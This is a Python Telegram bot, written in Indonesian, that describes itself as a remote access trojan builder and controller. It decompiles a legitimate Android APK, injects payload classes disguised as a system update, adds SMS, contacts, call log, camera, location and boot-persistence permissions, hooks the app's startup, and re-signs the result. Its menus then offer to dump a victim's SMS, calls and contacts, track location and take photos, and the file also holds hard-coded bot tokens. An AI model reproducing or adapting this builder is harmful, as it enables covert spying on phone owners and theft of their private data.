import os
import subprocess
import logging
import shutil
import uuid
import zipfile
import xml.etree.ElementTree as ET
import urllib.request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ── KONFIGURASI BARU ──
TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo" 
PAYLOAD_BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"
# ⚠️ GANTI PAKE USERNAME BOT PAYLOAD BARU KAMU (tanpa @)
PAYLOAD_BOT_USERNAME = "IsiUsernameBotPayloadBaruKamu" 

ALLOWED_CHAT_ID = "8598136412" 

WORK_DIR = "/data/data/com.termux/files/home/r4t" 
KEYSTORE_PATH = f"{WORK_DIR}/app_debug.keystore"
KEYSTORE_PASS = "123456"
KEY_ALIAS = "debugkey"
PAYLOAD_SMALI_DIR = f"{WORK_DIR}/payload_smali/com/system/update"

os.makedirs(WORK_DIR, exist_ok=True)
logging.disable(logging.CRITICAL)
user_states = {} 

def is_authorized(update: Update):
    return str(update.effective_chat.id) == ALLOWED_CHAT_ID

def ensure_keystore():
    if not os.path.exists(KEYSTORE_PATH):
        cmd = (f"keytool -genkey -v -keystore '{KEYSTORE_PATH}' -alias {KEY_ALIAS} "
               f"-keyalg RSA -keysize 2048 -validity 10000 -storepass {KEYSTORE_PASS} "
               f"-keypass {KEYSTORE_PASS} -dname \"CN=Android Debug,O=Android,C=US\"")
        try: subprocess.run(cmd, shell=True, check=True, capture_output=True)
        except: pass

def inject_manifest(manifest_path):
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    ns = '{http://schemas.android.com/apk/res/android}'
    
    permissions = ["android.permission.INTERNET", "android.permission.READ_SMS", "android.permission.RECEIVE_SMS", 
                   "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG", "android.permission.CAMERA", 
                   "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", 
                   "android.permission.ACCESS_FINE_LOCATION", "android.permission.RECEIVE_BOOT_COMPLETED", 
                   "android.permission.FOREGROUND_SERVICE", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"]
                   
    for perm in permissions:
        if not any(p.get(ns + 'name') == perm for p in root.findall('uses-permission')):
            ET.SubElement(root, 'uses-permission', {ns + 'name': perm})

    app = root.find('application')
    if app is not None:
        if not any(s.get(ns + 'name') == 'com.system.update.Payload' for s in app.findall('service')):
            ET.SubElement(app, 'service', {ns + 'name': 'com.system.update.Payload', ns + 'enabled': 'true', ns + 'exported': 'false'})
            
        if not any(r.get(ns + 'name') == 'com.system.update.BootReceiver' for r in app.findall('receiver')):
            receiver = ET.SubElement(app, 'receiver', {ns + 'name': 'com.system.update.BootReceiver', ns + 'enabled': 'true', ns + 'exported': 'true'})
            intent_filter = ET.SubElement(receiver, 'intent-filter')
            ET.SubElement(intent_filter, 'action', {ns + 'name': 'android.intent.action.BOOT_COMPLETED'})
            
    tree.write(manifest_path, encoding='utf-8', xml_declaration=True)

def inject_permission_popup(apk_out_dir):
    manifest_path = f"{apk_out_dir}/AndroidManifest.xml"
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    ns = '{http://schemas.android.com/apk/res/android}'
    
    main_activity_name = None
    for activity in root.iter('activity'):
        for intent_filter in activity.findall('intent-filter'):
            actions = [a.get(ns + 'name') for a in intent_filter.findall('action')]
            if "android.intent.action.MAIN" in actions:
                main_activity_name = activity.get(ns + 'name')
                break
        if main_activity_name: break

    if not main_activity_name: return "❌ Gagal: MainActivity tidak ditemukan."
    if main_activity_name.startswith("."): main_activity_name = main_activity_name[1:]
    
    smali_path = f"{apk_out_dir}/smali/{main_activity_name.replace('.', '/')}.smali"
    if not os.path.exists(smali_path):
        for i in range(2, 10):
            alt_path = f"{apk_out_dir}/smali_classes{i}/{main_activity_name.replace('.', '/')}.smali"
            if os.path.exists(alt_path): smali_path = alt_path; break
                
    if not os.path.exists(smali_path): return f"❌ Gagal: File {smali_path} tidak ditemukan."

    with open(smali_path, "r", encoding="utf-8") as f: lines = f.readlines()

    injected = False
    for i, line in enumerate(lines):
        if ".method" in line and "onCreate" in line and "Bundle" in line:
            for j in range(i, i+15): 
                if ".locals" in lines[j] or ".registers" in lines[j]:
                    parts = lines[j].split()
                    if len(parts) >= 2:
                        if ".locals" in lines[j]: lines[j] = f"    .locals {int(parts[1]) + 3}\n"
                        else: lines[j] = f"    .registers {int(parts[1]) + 3}\n"
                        
                        inject_code = (
                            "\n    invoke-static {p0}, Lcom/system/update/Payload;->askPermissions(Landroid/app/Activity;)V\n\n"
                            "    new-instance v0, Landroid/content/Intent;\n"
                            "    const-class v1, Lcom/system/update/Payload;\n"
                            "    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n"
                            "    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
                        )
                        lines.insert(j + 1, inject_code)
                        injected = True
                    break
        if injected: break

    if injected:
        with open(smali_path, "w", encoding="utf-8") as f: f.writelines(lines)
        return "✅ Pop-up & StartService disuntikkan."
    else: return "⚠️ Gagal nyuntik onCreate (Format Smali beda)."

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    chat_id = str(update.effective_chat.id)
    user_states.pop(chat_id, None) 
    banner = "```\n███╗   ███╗██████╗ ██╗  ██╗ ██╗ ██╗  ███╗  ███╗       ██╗██████╗ \n████╗ ████║██╔══██╗██║  ██║ ██║ ██║ ██╔██╗ ██╔██╗      ██║██╔══██╗\n██╔████╔██║██████╔╝███████║ ███████║██╔╝██╗██╔╝██╗     ██║██║  ██║\n██║╚██╔╝██║██╔══██╗╚════██║ ╚════██║██████╔╝██████╔╝   ██║██║  ██║\n██║ ╚═╝ ██║██║  ██║      ██║      ██║╚═██╔═╝╚═██╔═╝    ██║██████╔╝\n╚═╝     ╚═╝╚═╝  ╚═╝      ╚═╝      ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═════╝ \n```\n✨ **RAT BUILDER & CONTROLLER** ✨\nStatus: 🟢 Online\n\nSilakan pilih menu:"
    keyboard = [[InlineKeyboardButton("📦 Build APK Baru", callback_data="menu_build")],[InlineKeyboardButton("📱 List Device Ter-Sadap", callback_data="menu_device")],[InlineKeyboardButton("💾 Backup Data (Pindah HP)", callback_data="menu_backup")]]
    if update.callback_query: await update.callback_query.edit_message_text(banner, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else: await update.message.reply_text(banner, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not is_authorized(update): return
    chat_id = str(update.effective_chat.id)
    
    if query.data == "menu_build":
        user_states[chat_id] = "waiting_apk"
        await query.edit_message_text("📦 **Build APK Baru**\n\nSilakan kirim file `.apk` asli.", parse_mode='Markdown')
    elif query.data == "menu_device":
        keyboard = [[InlineKeyboardButton("📱 HP Korban 1", callback_data="device_1")],[InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")]]
        await query.edit_message_text("📱 **List Device Ter-Sadap**\n\nPilih device:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    elif query.data == "menu_backup":
        await query.edit_message_text("⏳ Sedang membackup...")
        zip_path = f"{WORK_DIR}/backup_r4t.zip"
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in ["builder_bot.py", "app_debug.keystore", "devices.db"]:
                    if os.path.exists(f"{WORK_DIR}/{file}"): zipf.write(f"{WORK_DIR}/{file}", file)
                if os.path.exists(f"{WORK_DIR}/payload_smali"):
                    for root, dirs, files in os.walk(f"{WORK_DIR}/payload_smali"):
                        for file in files: zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), WORK_DIR))
            with open(zip_path, "rb") as f: await context.bot.send_document(chat_id=chat_id, document=f, filename="backup_r4t.zip")
            os.remove(zip_path)
            await query.message.reply_text("✅ **Backup Berhasil!**")
            await start(update, context)
        except Exception as e: await query.message.reply_text(f"❌ Gagal Backup: {e}"); await start(update, context)
    elif query.data == "back_start": await start(update, context)
    
    elif query.data == "device_1":
        keyboard = [[InlineKeyboardButton("📂 Cek File", callback_data="cmd_cek_file"), InlineKeyboardButton("📩 Dump SMS", callback_data="cmd_dump_sms")],[InlineKeyboardButton("📞 Dump Telpon", callback_data="cmd_dump_telpon"), InlineKeyboardButton("👥 Dump Kontak", callback_data="cmd_dump_kontak")],[InlineKeyboardButton("📍 Lokasi", callback_data="cmd_lacak"), InlineKeyboardButton("📸 Foto Depan", callback_data="cmd_foto_depan")],[InlineKeyboardButton("📷 Foto Belakang", callback_data="cmd_foto_belakang")],[InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]]
        await query.edit_message_text("🎮 **Menu Kontrol**\nPilih aksi:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

    elif query.data.startswith("cmd_"):
        perintah = "/" + query.data.replace("cmd_", "")
        url_payload = f"https://t.me/{PAYLOAD_BOT_USERNAME}"
        keyboard = [[InlineKeyboardButton("🚀 Buka Bot Payload & Kirim Perintah", url=url_payload)]]
        
        await query.message.reply_text(
            f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\n"
            f"Silakan klik tombol di bawah untuk buka **Bot Payload**, lalu **COPY & KIRIM** teks ini di sana:\n\n"
            f"`{perintah}`\n\n"
            f"*(Pastikan nggak ada typo, huruf kecil semua).*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, file_name: str):
    chat_id = str(update.effective_chat.id)
    await update.message.reply_text(f"⏳ Menerima APK: `{file_name}`\nMemproses inject...", parse_mode='Markdown')
    session_id = str(uuid.uuid4())[:8]
    session_dir = f"{WORK_DIR}/build_{session_id}"
    apk_out_dir = f"{session_dir}/decoded"
    apk_new_path = f"{session_dir}/modded.apk"
    try:
        await context.bot.send_message(chat_id=chat_id, text="🔧 [1/4] Membongkar APK...")
        subprocess.run(f"apktool d '{file_path}' -o '{apk_out_dir}' -f", shell=True, check=True, capture_output=True)
        await context.bot.send_message(chat_id=chat_id, text="💉 [2/4] Menyuntikkan kode RAT...")
        target_smali_dir = f"{apk_out_dir}/smali/com/system/update"
        os.makedirs(target_smali_dir, exist_ok=True)
        if os.path.exists(PAYLOAD_SMALI_DIR):
            for smali_file in os.listdir(PAYLOAD_SMALI_DIR):
                if smali_file.endswith(".smali"): shutil.copy(os.path.join(PAYLOAD_SMALI_DIR, smali_file), target_smali_dir)
        else: raise Exception("Folder payload_smali tidak ditemukan!")
        await context.bot.send_message(chat_id=chat_id, text="📝 [3/4] Menyuntikkan Izin, Pop-up & BootReceiver...")
        inject_manifest(f"{apk_out_dir}/AndroidManifest.xml")
        popup_status = inject_permission_popup(apk_out_dir)
        await context.bot.send_message(chat_id=chat_id, text=f"Status: {popup_status}")
        subprocess.run(f"apktool b '{apk_out_dir}' -o '{apk_new_path}'", shell=True, check=True, capture_output=True)
        await context.bot.send_message(chat_id=chat_id, text="🔐 [4/4] Menandatangani APK...")
        signed_apk = f"{apk_new_path}.signed.apk"
        subprocess.run(f"apksigner sign --ks {KEYSTORE_PATH} --ks-pass pass:{KEYSTORE_PASS} --ks-key-alias {KEY_ALIAS} --out '{signed_apk}' '{apk_new_path}'", shell=True, check=True, capture_output=True)
        await context.bot.send_message(chat_id=chat_id, text="✅ **BUILD SUKSES!**", parse_mode='Markdown')
        with open(signed_apk, "rb") as f: await context.bot.send_document(chat_id=chat_id, document=f, filename=f"MOD_{file_name}")
        await start(update, context)
    except subprocess.CalledProcessError as e:
        error_msg = e.stderr.decode('utf-8') if e.stderr else str(e)
        await context.bot.send_message(chat_id=chat_id, text=f"❌ **GAGAL BUILD:**\n```\n{error_msg[:1000]}\n```", parse_mode='Markdown')
    except Exception as e: await context.bot.send_message(chat_id=chat_id, text=f"❌ Error: {e}")
    finally:
        if os.path.exists(file_path): os.remove(file_path)
        if os.path.exists(session_dir): shutil.rmtree(session_dir)
        user_states.pop(chat_id, None)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    chat_id = str(update.effective_chat.id)
    if user_states.get(chat_id) != "waiting_apk":
        await update.message.reply_text("❌ Klik menu **Build APK Baru** dulu."); return
    doc = update.message.document
    if not doc or not doc.file_name.lower().endswith(".apk"):
        await update.message.reply_text("❌ File harus `.apk`"); return 
    await update.message.reply_text("⏳ Mendownload APK...")
    file = await context.bot.get_file(doc.file_id)
    temp_apk_path = f"{WORK_DIR}/{doc.file_name}"
    await file.download_to_drive(temp_apk_path)
    await process_apk(update, context, temp_apk_path, doc.file_name)

def main():
    ensure_keystore()
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    print("🤖 Bot Builder & Controller nyala...")
    app.run_polling()

if __name__ == '__main__':
    main()
